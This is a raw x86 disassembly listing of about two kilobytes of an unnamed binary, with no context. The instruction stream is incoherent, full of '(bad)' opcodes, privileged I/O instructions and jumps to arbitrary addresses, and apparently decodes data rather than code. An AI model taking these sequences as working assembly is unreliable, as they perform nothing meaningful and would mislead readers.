  41f5a3:	call   0xca6f0efe
  41f5a8:	aas    
  41f5a9:	sbb    eax,DWORD PTR [ebx+0x46]
  41f5ac:	pop    edx
  41f5ad:	pop    esi
  41f5ae:	push   ebp
  41f5af:	int3   
  41f5b0:	sbb    al,0x5e
  41f5b2:	imul   esp,DWORD PTR [ecx-0xad73990],0xffffffa5
  41f5b9:	iret   
  41f5ba:	repz jle 0x41f576
  41f5bd:	outs   dx,BYTE PTR ds:[esi]
  41f5be:	hlt    
  41f5bf:	mov    esp,0x34a1100d
  41f5c4:	loop   0x41f5e4
  41f5c6:	push   ebx
  41f5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5c8:	test   al,0xd1
  41f5ca:	aaa    
  41f5cb:	and    ch,bl
  41f5cd:	mov    edx,0x7e43fb42
  41f5d2:	and    eax,0x7a6c667d
  41f5d7:	inc    eax
  41f5d8:	cmp    DWORD PTR [ebx-0x477fb9bc],ebx
  41f5de:	push   esi
  41f5df:	push   ebp
  41f5e0:	lds    eax,FWORD PTR [eax+0x492c1f37]
  41f5e6:	cld    
  41f5e7:	and    ch,ah
  41f5e9:	inc    edx
  41f5ea:	mov    ds:0xd1c396e0,al
  41f5ef:	adc    BYTE PTR [edi+0x4448507b],bh
  41f5f5:	rcr    BYTE PTR [edi-0x52],cl
  41f5f8:	sbb    eax,DWORD PTR [ebx-0x2d6534c5]
  41f5fe:	scas   eax,DWORD PTR es:[edi]
  41f5ff:	int    0x5e
  41f601:	add    BYTE PTR [edi+0x624f7f93],dh
  41f607:	dec    esi
  41f608:	adc    eax,0xa3a2e992
  41f60d:	fdivr  DWORD PTR [edx]
  41f60f:	arpl   di,ax
  41f611:	xor    BYTE PTR [edi+eax*8-0x21],bh
  41f615:	jge    0x41f5ad
  41f617:	push   edi
  41f618:	inc    ecx
  41f619:	dec    ebx
  41f61a:	popa   
  41f61b:	mov    al,ds:0x9e5ea413
  41f620:	call   0xc580ae63
  41f625:	aam    0xed
  41f627:	iret   
  41f628:	aas    
  41f629:	(bad)  
  41f62a:	mov    ch,0x7
  41f62c:	jmp    0x2f5f:0x55605d26
  41f633:	sub    BYTE PTR [edi+0x475e552c],cl
  41f639:	iret   
  41f63a:	pop    edi
  41f63b:	inc    ebp
  41f63c:	mov    BYTE PTR [ecx-0x15],bh
  41f63f:	lds    edx,FWORD PTR [ecx+0x6e]
  41f642:	pop    esi
  41f643:	mov    ah,0xf4
  41f645:	shr    BYTE PTR [eax+0x3a],1
  41f648:	xchg   ecx,esp
  41f64a:	xor    ebx,0x87841651
  41f650:	out    0xf4,al
  41f652:	cdq    
  41f653:	jne    0x41f61b
  41f655:	or     eax,0x77064a17
  41f65a:	addr16 pusha 
  41f65c:	mov    al,ds:0x60a99387
  41f661:	sahf   
  41f662:	adc    eax,0x40d0a2f2
  41f667:	ins    BYTE PTR es:[edi],dx
  41f668:	out    0xd6,al
  41f66a:	push   0xcb50e5ed
  41f66f:	sbb    ebp,edi
  41f671:	test   eax,0x7c3ca8d9
  41f676:	pop    esp
  41f677:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41f679:	dec    edi
  41f67a:	(bad)  
  41f67b:	fbld   TBYTE PTR [ebx-0x15cab4aa]
  41f681:	stos   DWORD PTR es:[edi],eax
  41f682:	xchg   ebx,eax
  41f683:	cmc    
  41f684:	ss pop ss
  41f686:	lea    esp,cs:[ebp+edx*2-0x3a]
  41f68b:	leave  
  41f68c:	push   ds
  41f68d:	je     0x41f6f2
  41f68f:	xchg   edx,eax
  41f690:	rcl    BYTE PTR [eax],1
  41f692:	xlat   BYTE PTR ds:[ebx]
  41f693:	mov    edi,0xa6632b09
  41f698:	pop    es
  41f699:	jae    0xb52c5852
  41f69f:	xchg   ebx,eax
  41f6a0:	sahf   
  41f6a1:	inc    esp
  41f6a2:	(bad)  
  41f6a3:	aas    
  41f6a4:	in     eax,0x93
  41f6a6:	cmp    edx,DWORD PTR [eax]
  41f6a8:	jae    0x41f6f4
  41f6aa:	jnp    0x41f69b
  41f6ac:	sub    dh,BYTE PTR [eax-0x50]
  41f6af:	add    esp,DWORD PTR [esi+0x4c]
  41f6b2:	xor    DWORD PTR [edx-0x26],0x1
  41f6b6:	mov    dl,0x1
  41f6b8:	xlat   BYTE PTR ds:[ebx]
  41f6b9:	and    bl,ah
  41f6bb:	sub    bl,BYTE PTR [esi]
  41f6bd:	rcl    DWORD PTR [ebp-0x59b21e55],1
  41f6c3:	je     0x41f744
  41f6c5:	or     eax,0x1b7a301f
  41f6ca:	lods   eax,DWORD PTR ds:[esi]
  41f6cb:	add    eax,0x52211da
  41f6d0:	push   0x76c375ba
  41f6d5:	xor    edi,DWORD PTR [ecx+ecx*8]
  41f6d8:	fwait
  41f6d9:	ss jnp 0x41f676
  41f6dc:	aaa    
  41f6dd:	and    al,0x13
  41f6df:	mov    ecx,0x66464a54
  41f6e4:	test   DWORD PTR [edx-0x1329b48d],ebp
  41f6ea:	outs   dx,DWORD PTR ds:[esi]
  41f6eb:	mov    WORD PTR [edi+edx*8-0x66],?
  41f6ef:	jbe    0x41f759
  41f6f1:	jecxz  0x41f6f8
  41f6f3:	ins    BYTE PTR es:[edi],dx
  41f6f4:	add    bl,BYTE PTR [esi+0x5a5dc2cb]
  41f6fa:	sbb    bh,BYTE PTR [ebx+0x6c]
  41f6fd:	xor    DWORD PTR [esi-0x50],eax
  41f700:	lods   al,BYTE PTR ds:[esi]
  41f701:	hlt    
  41f702:	std    
  41f703:	icebp  
  41f704:	push   edi
  41f705:	xchg   ebp,eax
  41f706:	mov    bl,0xd4
  41f708:	adc    BYTE PTR [ebx],0xf2
  41f70b:	hlt    
  41f70c:	or     eax,0xeea09ac7
  41f711:	retf   0xe920
  41f714:	xor    al,0x18
  41f716:	retf   
  41f717:	xor    cl,BYTE PTR [ecx+esi*1]
  41f71a:	cmp    ebp,DWORD PTR [ebx-0x76]
  41f71d:	retf   
  41f71e:	push   edx
  41f71f:	xor    dl,BYTE PTR [ebp+0x7749b9d1]
  41f725:	and    eax,DWORD PTR [ecx+0x5caeff4c]
  41f72b:	sub    bh,BYTE PTR [eax]
  41f72d:	loop   0x41f6f9
  41f72f:	jecxz  0x41f74c
  41f731:	sub    DWORD PTR [ebp+0x6],esp
  41f734:	xchg   ecx,eax
  41f735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f736:	shl    BYTE PTR [ebp-0x69],cl
  41f739:	mov    ecx,0xe11e6967
  41f73e:	push   edi
  41f73f:	arpl   WORD PTR ds:[ecx+0x22],bp
  41f743:	bound  eax,QWORD PTR [edx+0x63]
  41f746:	xor    esi,DWORD PTR [ebx-0x26802678]
  41f74c:	scas   al,BYTE PTR es:[edi]
  41f74d:	mov    ss,WORD PTR [ecx]
  41f74f:	jne    0x41f758
  41f751:	sub    eax,0x724b8cd8
  41f756:	add    BYTE PTR [ebp+0xbfa391a],bl
  41f75c:	int3   
  41f75d:	aas    
  41f75e:	mov    bh,0x6d
  41f760:	cmp    al,0x53
  41f762:	mov    dl,0x9f
  41f764:	jg     0x41f76c
  41f766:	test   eax,0x740cf262
  41f76b:	(bad)  
  41f76c:	xchg   edx,eax
  41f76d:	xchg   ebx,eax
  41f76e:	mov    WORD PTR [ecx-0x1a2212ad],?
  41f774:	scas   al,BYTE PTR es:[edi]
  41f775:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f776:	test   esp,0x992d7e00
  41f77c:	(bad)  
  41f77d:	xor    eax,0xff2423dc
  41f782:	or     al,0xb2
  41f784:	mov    al,ds:0x5e21498a
  41f789:	adc    BYTE PTR [ecx+0x1d],bl
  41f78c:	imul   eax,ebx,0x77a8aacf
  41f792:	xchg   edi,eax
  41f793:	or     ah,bl
  41f795:	jae    0x41f80a
  41f797:	xchg   DWORD PTR [eax],esi
  41f799:	mov    esp,0x4711a26f
  41f79e:	jmp    0x41f7d2
  41f7a0:	sbb    BYTE PTR [esi-0x4],dl
  41f7a3:	scas   al,BYTE PTR es:[edi]
  41f7a4:	jmp    0x41f7ec
  41f7a6:	cli    
  41f7a7:	jmp    0x41f7c8
  41f7a9:	les    edx,FWORD PTR [edx+0x68]
  41f7ac:	xchg   esi,eax
  41f7ad:	push   0x5c296ea8
  41f7b2:	fsubr  st(4),st
  41f7b4:	dec    edx
  41f7b5:	cmp    eax,DWORD PTR [edi-0x75]
  41f7b8:	cmp    DWORD PTR [edx+0x1ba48428],edi
  41f7be:	jno    0x41f7dc
  41f7c0:	addr16 jno 0x41f829
  41f7c3:	scas   al,BYTE PTR es:[edi]
  41f7c4:	cmp    ch,bl
  41f7c6:	std    
  41f7c7:	mov    ecx,0xcf3ca139
  41f7cc:	je     0x41f792
  41f7ce:	in     eax,0x52
  41f7d0:	(bad)  
  41f7d1:	xchg   ebp,eax
  41f7d2:	xor    eax,0xdda2efb
  41f7d7:	test   eax,0xda6e139e
  41f7dc:	int    0xc
  41f7de:	in     eax,dx
  41f7df:	xor    eax,DWORD PTR [eax-0x4c]
  41f7e2:	pushf  
  41f7e3:	test   ebx,0x9448237c
  41f7e9:	cs adc ebx,0x7c
  41f7ed:	add    al,0xaf
  41f7ef:	pop    ss
  41f7f0:	jmp    0x6d755cca
  41f7f5:	aaa    
  41f7f6:	fild   DWORD PTR [ebx+ebx*1+0x4cb68945]
  41f7fd:	push   0xca1001bc
  41f802:	enter  0x6eec,0xb3
  41f806:	cs inc ebx
  41f808:	retf   
  41f809:	mov    bl,0xb0
  41f80b:	cmc    
  41f80c:	add    eax,0x12dd9844
  41f811:	jno    0x41f7c2
  41f813:	das    
  41f814:	pop    esp
  41f815:	repz and al,BYTE PTR [ecx+eax*8+0x4d]
  41f81a:	es jne 0x41f884
  41f81d:	ins    BYTE PTR es:[edi],dx
  41f81e:	ret    0x9451
  41f821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f822:	and    edx,ecx
  41f824:	cld    
  41f825:	adc    BYTE PTR [edi+ecx*1+0x7d82d0a],dh
  41f82c:	mov    edx,0x3a361cc2
  41f831:	loopne 0x41f84e
  41f833:	inc    ebx
  41f834:	adc    BYTE PTR [esp+ecx*8+0x68],dh
  41f838:	xchg   DWORD PTR [edi-0x28],esp
  41f83b:	ds or  eax,0xe36ba2ec
  41f841:	fcomp  DWORD PTR [ebp+0x20]
  41f844:	sahf   
  41f845:	mov    edi,0x92416d14
  41f84a:	sub    DWORD PTR [edx],esi
  41f84c:	ror    DWORD PTR [eax+eiz*4],cl
  41f84f:	push   esp
  41f850:	repz sbb eax,0x44ebc88d
  41f856:	dec    esi
  41f857:	xor    al,0x13
  41f859:	jmp    0x41f874
  41f85b:	inc    ecx
  41f85c:	cmp    eax,0x1d480a46
  41f861:	xchg   DWORD PTR [edi],eax
  41f863:	ins    DWORD PTR es:[edi],dx
  41f864:	and    eax,0x4bfb5f76
  41f869:	xchg   ebx,eax
  41f86a:	sbb    DWORD PTR [edi],edx
  41f86c:	jae    0x41f886
  41f86e:	inc    ecx
  41f86f:	ror    BYTE PTR [edx-0x27],0x9f
  41f873:	and    BYTE PTR [esi-0x70e8519a],bl
  41f879:	int3   
  41f87a:	leave  
  41f87b:	cmp    al,0x2e
  41f87d:	loopne 0x41f8f2
  41f87f:	push   eax
  41f880:	inc    edi
  41f881:	into   
  41f882:	stos   DWORD PTR es:[edi],eax
  41f883:	xor    eax,0xa16b6e6e
  41f888:	fst    DWORD PTR [ebp+0x5a8f5ccc]
  41f88e:	int    0xd4
  41f890:	mov    cl,BYTE PTR [esi]
  41f892:	pop    ebp
  41f893:	push   ebx
  41f894:	test   DWORD PTR [ebp+0x3d],eax
  41f897:	mov    DWORD PTR [ecx],0x442c493f
  41f89d:	and    al,0xb2
  41f89f:	sub    DWORD PTR [esi+edi*1-0x1c],edi
  41f8a3:	xchg   ebp,eax
  41f8a4:	daa    
  41f8a5:	pop    ebp
  41f8a6:	sub    DWORD PTR [esi+0x5fc644b3],ecx
  41f8ac:	jecxz  0x41f882
  41f8ae:	(bad)  
  41f8af:	xor    eax,0x2444ff7d
  41f8b4:	(bad)  
  41f8b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8b6:	shl    cl,1
  41f8b8:	aas    
  41f8b9:	mov    eax,0x2b856a9c
  41f8be:	xor    eax,0x2423ecb9
  41f8c3:	dec    edx
  41f8c4:	addr16 gs test eax,0xf0f6c085
  41f8cb:	mov    ch,0x8b
  41f8cd:	and    al,0xac
  41f8cf:	lea    esp,[edx]
  41f8d1:	fprem1 
  41f8d3:	xor    DWORD PTR cs:[edi],edx
  41f8d6:	dec    esp
  41f8d7:	stos   BYTE PTR es:[edi],al
  41f8d8:	fdivr  st(5),st
  41f8da:	sub    ebx,DWORD PTR [edi+0x6ac32403]
  41f8e0:	and    edx,eax
  41f8e2:	mov    WORD PTR [ebp+0xd29446d],cs
  41f8e8:	lock out dx,eax
  41f8ea:	mov    ds:0xa671eb94,eax
  41f8ef:	mov    eax,ds:0x9f4bbb3a
  41f8f4:	popf   
  41f8f5:	and    al,0x99
  41f8f7:	xchg   ebx,eax
  41f8f8:	sbb    bh,BYTE PTR [eax+0x4d9f0b06]
  41f8fe:	dec    ecx
  41f8ff:	mov    ebp,0x7da9e00c
  41f904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f905:	xchg   BYTE PTR [ebp+0x1a],ah
  41f908:	mov    bl,0x95
  41f90a:	ret    0xebb
  41f90d:	mov    al,0x9f
  41f90f:	pusha  
  41f910:	retf   
  41f911:	push   edx
  41f912:	mov    ah,0x85
  41f914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f915:	das    
  41f916:	jl     0x41f902
  41f918:	push   esp
  41f919:	jmp    0xf954:0x6c1d6ad0
  41f920:	adc    eax,0xc7d057c6
  41f925:	cmc    
  41f926:	dec    esi
  41f927:	push   ebx
  41f928:	shl    BYTE PTR [eax],1
  41f92a:	mov    al,ds:0xbbe1f4b7
  41f92f:	or     BYTE PTR [edi+0x443abf47],0x4
  41f936:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f937:	je     0x41f8d7
  41f939:	xor    edi,DWORD PTR [ebx-0x45]
  41f93c:	and    al,BYTE PTR [edi]
  41f93e:	test   BYTE PTR [edx-0xa],dl
  41f941:	mov    ds:0x46f8db,al
  41f946:	and    BYTE PTR [edx+edi*1],bl
  41f949:	cmp    BYTE PTR [edi-0x6bac6878],cl
  41f94f:	or     BYTE PTR ds:0xb38470b8,dh
  41f955:	je     0x41f955
  41f957:	mov    eax,ds:0xe7d806e5
  41f95c:	jmp    0x701ea2f
  41f961:	mov    edi,0xc724c844
  41f966:	stc    
  41f967:	js     0x41f9a8
  41f969:	rcr    ch,0x9b
  41f96c:	xchg   dx,ax
  41f96e:	dec    ebx
  41f96f:	inc    ebx
  41f970:	mov    eax,ds:0x9a245f9a
  41f975:	sub    al,0xca
  41f977:	sub    eax,0xf1472653
  41f97c:	adc    ecx,DWORD PTR [ebx-0x1a]
  41f97f:	mov    cl,0x2
  41f981:	jle    0x41f9d2
  41f983:	pop    ebp
  41f984:	loope  0x41f925
  41f986:	dec    ecx
  41f987:	sbb    al,0x80
  41f989:	jb     0x41f949
  41f98b:	sbb    BYTE PTR [edx+0x736da6ce],bl
  41f991:	cmp    ecx,eax
  41f993:	jmp    0x41f93f
  41f995:	mov    DWORD PTR [esi-0x2],esi
  41f998:	xchg   si,ax
  41f99a:	mov    BYTE PTR ds:0xf4da30dc,ch
  41f9a0:	test   eax,0x8e51f634
  41f9a5:	js     0x41f974
  41f9a7:	pop    esi
  41f9a8:	mov    eax,0xd7bd9f53
  41f9ad:	mov    dl,0x8
  41f9af:	in     al,dx
  41f9b0:	adc    al,0xac
  41f9b2:	test   DWORD PTR [ebx-0x7e6929d1],0x6454050a
  41f9bc:	dec    BYTE PTR [edi+0x543ad4a0]
  41f9c2:	mov    DWORD PTR [edx],edi
  41f9c4:	sub    esp,DWORD PTR [ebx]
  41f9c6:	aam    0xff
  41f9c8:	inc    esp
  41f9ca:	jo     0x41f95f
  41f9cc:	and    al,0x26
  41f9ce:	and    dl,BYTE PTR [ebx+0x621ea328]
  41f9d4:	xor    ah,BYTE PTR [esi+ecx*4-0x35]
  41f9d8:	pop    ds
  41f9d9:	popa   
  41f9da:	xchg   ebp,eax
  41f9db:	(bad)  
  41f9dc:	dec    edx
  41f9dd:	xchg   DWORD PTR [ebp+eax*4-0x64a3228],eax
  41f9e4:	sbb    DWORD PTR [edx],0xffffffab
  41f9e7:	loopne 0x41f9a0
  41f9e9:	mov    esp,0xf05fef79
  41f9ee:	jp     0x41fa0a
  41f9f0:	ror    BYTE PTR [ebp+esi*8+0xb],0x8
  41f9f5:	push   0x3b738709
  41f9fa:	cmp    ebp,DWORD PTR [eax-0x537a962b]
  41fa00:	cs out 0x74,eax
  41fa03:	in     al,0xe4
  41fa05:	jle    0x41fa1e
  41fa07:	jl     0x41fa67
  41fa09:	cs enter 0x6ddb,0x21
  41fa0e:	rcr    DWORD PTR [edx+esi*2+0x71],cl
  41fa12:	ja     0x41fa31
  41fa14:	in     eax,dx
  41fa15:	mov    ds:0xa6a432f0,al
  41fa1a:	js     0x41f9ea
  41fa1c:	xlat   BYTE PTR ds:[ebx]
  41fa1d:	jnp    0x41fa8d
  41fa1f:	icebp  
  41fa20:	mov    BYTE PTR [esi+0x53ac0f34],al
  41fa26:	jb     0x41fa1f
  41fa28:	adc    BYTE PTR [edx],al
  41fa2a:	xor    al,0x42
  41fa2c:	into   
  41fa2d:	out    0x29,al
  41fa2f:	inc    ebp
  41fa30:	push   cs
  41fa31:	mov    eax,ds:0x7ca6e7db
  41fa36:	dec    edi
  41fa37:	jmp    0xc270:0x2c7dadec
  41fa3e:	int3   
  41fa3f:	inc    ebp
  41fa40:	and    cl,al
  41fa42:	(bad)  
  41fa43:	or     al,0xb1
  41fa45:	mov    bh,0x9a
  41fa47:	mov    ebx,DWORD PTR [bx+0x76]
  41fa4b:	jmp    0x41fa74
  41fa4d:	test   eax,0x1ceb0809
  41fa52:	mov    ch,0xb1
  41fa54:	xchg   edx,eax
  41fa55:	stos   BYTE PTR es:[edi],al
  41fa56:	lock or bh,BYTE PTR ds:0xffb8866d
  41fa5d:	sti    
  41fa5e:	sub    esi,esp
  41fa60:	(bad)  
  41fa62:	push   ss
  41fa63:	cmp    BYTE PTR [ebp-0x2f091205],ch
  41fa69:	out    0xa7,al
  41fa6b:	sub    al,0xa
  41fa6d:	mov    ds,WORD PTR [edi+0x2]
  41fa70:	hlt    
  41fa71:	(bad)  
  41fa72:	adc    al,0x12
  41fa74:	mov    ds:0x1e054937,eax
  41fa79:	pop    esi
  41fa7a:	sbb    ecx,DWORD PTR [ecx+ebp*2-0x6b]
  41fa7e:	in     al,0x9b
  41fa80:	out    0x18,al
  41fa82:	mov    dl,BYTE PTR [ebx-0x72]
  41fa85:	pop    esp
  41fa86:	push   ds
  41fa87:	push   ds
  41fa88:	inc    edx
  41fa89:	and    eax,0x2fff6f4b
  41fa8e:	dec    esp
  41fa8f:	fisub  DWORD PTR [esp+eiz*4-0x45]
  41fa93:	dec    edi
  41fa94:	sti    
  41fa95:	iret   
  41fa96:	maskmovq mm1,mm2
  41fa99:	sub    BYTE PTR [eax-0x5d],ah
  41fa9c:	lahf   
  41fa9d:	sub    DWORD PTR [edx],ecx
  41fa9f:	pushf  
  41faa0:	mov    ch,0x9d
  41faa2:	xchg   esi,eax
  41faa3:	and    DWORD PTR [ecx],esi
  41faa5:	mov    dl,0x29
  41faa7:	jg     0x41faab
  41faa9:	or     BYTE PTR [ecx+0x61e4e575],dh
  41faaf:	xor    al,BYTE PTR [ebp+0x3d46ad0a]
  41fab5:	fwait
  41fab6:	xchg   ebp,eax
  41fab7:	push   esi
  41fab8:	inc    eax
  41fab9:	push   esp
  41faba:	mov    al,0x9d
  41fabc:	mov    ebx,0x2f789765
  41fac1:	popa   
  41fac2:	dec    esi
  41fac3:	xor    cl,BYTE PTR [eax]
  41fac5:	mov    ?,WORD PTR [ebx-0x2c679729]
  41facb:	imul   ebp,DWORD PTR [eax-0x3b7c1c34],0x1479cfa8
  41fad5:	xchg   edx,eax
  41fad6:	mov    ah,0x3
  41fad8:	jae    0x41fb31
  41fada:	mov    ah,0x41
  41fadc:	cmp    al,dl
  41fade:	mov    ebp,0xc661fc54
  41fae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fae4:	dec    esi
  41fae5:	jp     0x41fb51
  41fae7:	mov    ds:0xda67dc0f,eax
  41faec:	fst    QWORD PTR [ebx]
  41faee:	mov    al,0x1d
  41faf0:	retf   0x99bf
  41faf3:	fxch   st(4)
  41faf5:	adc    bl,cl
  41faf7:	inc    eax
  41faf8:	xchg   BYTE PTR [ecx],bh
  41fafa:	shl    ebx,cl
  41fafc:	dec    ebp
  41fafd:	jo     0x41fb05
  41faff:	in     al,dx
  41fb00:	pop    ss
  41fb01:	mov    bl,ch
  41fb03:	std    
  41fb04:	pop    ecx
  41fb05:	sahf   
  41fb06:	sbb    eax,0x18b88a8c
  41fb0b:	sub    eax,DWORD PTR [edi+edx*4-0x42]
  41fb0f:	and    bl,BYTE PTR [ecx-0x3c34866a]
  41fb15:	data16 stos BYTE PTR es:[edi],al
  41fb17:	push   cs
  41fb18:	push   ebx
  41fb19:	in     eax,0x8d
  41fb1b:	xor    edi,DWORD PTR [edi]
  41fb1d:	sub    eax,DWORD PTR [eax+esi*8-0x1e]
  41fb21:	pop    ebp
  41fb22:	(bad)  
  41fb23:	stc    
  41fb24:	push   esi
  41fb25:	rol    DWORD PTR [ebx-0x674fb2a4],cl
  41fb2b:	fs icebp 
  41fb2d:	and    edx,DWORD PTR [edx-0x60]
  41fb30:	inc    BYTE PTR [ebp+0x6a8a37eb]
  41fb36:	hlt    
  41fb37:	std    
  41fb38:	cmp    cl,BYTE PTR [edx-0x6e4aad0]
  41fb3e:	mov    bh,0xc3
  41fb40:	test   al,0xc3
  41fb42:	jmp    0x41fba9
  41fb44:	ret    0x9c22
  41fb47:	and    eax,0x7fc27ba8
  41fb4c:	(bad)  
  41fb4d:	jge    0x41fb3f
  41fb4f:	mov    bh,0xc8
  41fb51:	out    0xfc,al
  41fb53:	(bad)  
  41fb54:	mov    ds:0xbcdddf03,eax
  41fb59:	(bad)  
  41fb5a:	dec    esi
  41fb5b:	test   al,0x96
  41fb5d:	or     eax,eax
  41fb5f:	mov    ecx,0x4c5c2b7e
  41fb64:	mov    bl,0xe0
  41fb67:	xor    DWORD PTR [ecx+esi*1-0x429d623a],0xffffffb3
  41fb6f:	pushf  
  41fb70:	test   eax,0xe85af1be
  41fb75:	cmp    eax,0x3ed4afa5
  41fb7a:	mov    eax,ds:0x3e809f2b
  41fb7f:	fadd   st,st(6)
  41fb81:	pop    esi
  41fb82:	push   ebp
  41fb83:	xor    edi,0x9ee6a032
  41fb89:	mov    eax,0x7b37bd38
  41fb8e:	mov    esi,0x9dad12c
  41fb93:	call   0x2e92f321
  41fb98:	sub    al,BYTE PTR [esi-0x53]
  41fb9b:	xor    ah,bh
  41fb9d:	outs   dx,DWORD PTR ds:[esi]
  41fb9e:	xor    esp,ebp
  41fba0:	fs cli 
  41fba2:	xor    ah,BYTE PTR [ebp+0x7b]
  41fba5:	push   0x8
  41fba7:	and    DWORD PTR [edx],edx
  41fba9:	dec    ecx
  41fbaa:	add    eax,0x8611b775
  41fbaf:	dec    esp
  41fbb0:	adc    eax,0x8598272e
  41fbb5:	int    0x4a
  41fbb7:	pop    ebp
  41fbb8:	dec    ebp
  41fbb9:	dec    edx
  41fbba:	inc    esp
  41fbbb:	push   ebp
  41fbbc:	jecxz  0x41fc03
  41fbbe:	xchg   BYTE PTR [ebx+eax*2],ch
  41fbc1:	dec    ebx
  41fbc2:	pop    eax
  41fbc3:	jmp    0x1af91004
  41fbc8:	mov    ebx,0x973cdf7b
  41fbcd:	pop    esi
  41fbce:	cmp    DWORD PTR [edx],ebp
  41fbd0:	call   FWORD PTR [ebp+0x52030137]
  41fbd6:	imul   esi,DWORD PTR [eax],0xffffffe6
  41fbd9:	(bad)  
  41fbda:	js     0x41fbe1
  41fbdc:	xor    ch,BYTE PTR ds:[esi+0x741d696d]
  41fbe3:	jne    0x41fc36
  41fbe5:	sub    al,0x76
  41fbe7:	sub    eax,0x6ad64bc7
  41fbec:	and    eax,0x5e5470c0
  41fbf1:	jmp    0x41fb81
  41fbf3:	adc    al,0x91
  41fbf5:	sar    DWORD PTR [ebx],0x3f
  41fbf8:	cmp    eax,0xcacd0388
  41fbfd:	mul    DWORD PTR [ecx-0x63]
  41fc00:	xor    BYTE PTR ds:0x2b0280de,ch
  41fc06:	test   BYTE PTR ds:0xc410f3fe,0xae
  41fc0d:	int3   
  41fc0e:	icebp  
  41fc0f:	(bad)  
  41fc10:	(bad)  
  41fc12:	adc    dh,cl
  41fc14:	outs   dx,BYTE PTR ds:[esi]
  41fc15:	out    0x13,al
  41fc17:	push   0xe79da585
  41fc1c:	idiv   DWORD PTR [ecx]
  41fc1e:	ret    
  41fc1f:	mov    al,0x2a
  41fc21:	mov    eax,ds:0xb69c6125
  41fc26:	inc    esi
  41fc27:	and    eax,0xda65840c
  41fc2c:	jg     0x41fc8f
  41fc2e:	push   0xd30c4cb8
  41fc33:	xchg   edi,eax
  41fc34:	iret   
  41fc35:	dec    esp
  41fc36:	mov    dl,BYTE PTR [esi+0x15]
  41fc39:	je     0x41fbc6
  41fc3b:	jne    0x41fca2
  41fc3d:	bound  esi,QWORD PTR [edi-0x1b]
  41fc40:	neg    ebx
  41fc42:	mov    ds:0x6f36fb8,al
  41fc47:	repnz sbb dh,BYTE PTR [edx+0x44]
  41fc4b:	iret   
  41fc4c:	icebp  
  41fc4d:	jecxz  0x41fc44
  41fc4f:	jbe    0x41fcc2
  41fc51:	cwde   
  41fc52:	clc    
  41fc53:	adc    ch,BYTE PTR [ecx+0x52]
  41fc56:	inc    ebx
  41fc57:	(bad)  [ecx+esi*8-0x49]
  41fc5b:	das    
  41fc5c:	jbe    0x41fcd7
  41fc5e:	(bad)
  41fc61:	outs   dx,DWORD PTR ds:[esi]
  41fc62:	pop    esi
  41fc63:	pop    edx
  41fc64:	out    0x28,eax
  41fc66:	imul   ecx,DWORD PTR [ebx],0xda1a2c9c
  41fc6c:	lds    ebx,FWORD PTR [edi+0x24]
  41fc6f:	jp     0x41fc9d
  41fc71:	into   
  41fc72:	or     edx,DWORD PTR [edi-0x1669b7cd]
  41fc78:	and    al,0x2c
  41fc7a:	jne    0x41fc99
  41fc7c:	push   edx
  41fc7d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41fc7f:	xchg   esi,eax
  41fc80:	sbb    eax,esp
  41fc82:	mov    ds:0x4b5e3aab,al
  41fc87:	or     esp,esi
  41fc89:	daa    
  41fc8a:	mov    esi,0xd30b1b5e
  41fc8f:	es cmp ecx,esp
  41fc92:	and    BYTE PTR [edx],ch
  41fc94:	and    al,0xf3
  41fc96:	jecxz  0x41fc5f
  41fc98:	fs push esp
  41fc9a:	gs inc esp
  41fc9c:	cmp    al,0x70
  41fc9e:	leave  
  41fc9f:	ja     0x41fce3
  41fca1:	les    edi,FWORD PTR [ebp+edx*2-0x13f6dc88]
  41fca8:	fld    TBYTE PTR [esi+0xd172575]
  41fcae:	sbb    eax,0xa216af7b
  41fcb3:	inc    edx
  41fcb4:	mov    ah,0xf0
  41fcb6:	jp     0x41fceb
  41fcb8:	je     0x41fc42
  41fcba:	mov    ebp,0xb5ae919c
  41fcbf:	pusha  
  41fcc0:	push   ss
  41fcc1:	arpl   dx,dx
  41fcc3:	sub    bh,BYTE PTR [esi]
  41fcc5:	adc    BYTE PTR ds:0x1b32771d,0x4f
  41fccc:	dec    ebx
  41fccd:	jmp    FWORD PTR [ebx+edx*1+0x74f0aee8]
  41fcd4:	call   0xb593e599
  41fcd9:	je     0x41fcc0
  41fcdb:	xchg   BYTE PTR [edi+0x37],al
  41fcde:	cmp    ecx,DWORD PTR [ebp+0x38]
  41fce1:	call   ebp
  41fce3:	fimul  DWORD PTR [edx+0x9]
  41fce6:	fcom   DWORD PTR [edi+0x34]
  41fce9:	mov    ch,0x21
  41fceb:	leave  
  41fcec:	out    dx,al
  41fced:	add    BYTE PTR [edx+0x30],al
  41fcf0:	stos   BYTE PTR es:[edi],al
  41fcf1:	xlat   BYTE PTR ds:[ebx]
  41fcf2:	xchg   edi,eax
  41fcf3:	ins    BYTE PTR es:[edi],dx
  41fcf4:	fcom   st(0)
  41fcf6:	and    bh,BYTE PTR [ecx+0x7e4e9542]
  41fcfc:	pusha  
  41fcfd:	ret    
  41fcfe:	mov    eax,0x3818f26d
  41fd03:	or     esi,eax
  41fd05:	popa   
  41fd06:	arpl   dx,dx
  41fd08:	pop    ecx
  41fd09:	mov    esi,0xdd6d0435
  41fd0e:	or     cl,BYTE PTR [edi+0x12]
  41fd11:	and    al,0xad
  41fd13:	das    
  41fd14:	sbb    DWORD PTR [edx+ecx*8-0x34],edi
  41fd18:	arpl   WORD PTR [edx-0x23a39327],si
  41fd1e:	xor    bl,BYTE PTR ds:0xc31b1a8f
  41fd24:	out    dx,eax
  41fd25:	jp     0x41fccf
  41fd27:	inc    esp
  41fd28:	adc    ecx,DWORD PTR [ebx-0x6ce15d6f]
  41fd2e:	or     BYTE PTR [edi+0x7d],0x9b
  41fd32:	loopne 0x41fd5c
  41fd34:	cmp    BYTE PTR [edx+0x48b2fceb],cl
  41fd3a:	sub    edx,eax
  41fd3c:	add    cl,BYTE PTR [edi]
  41fd3e:	push   0x74
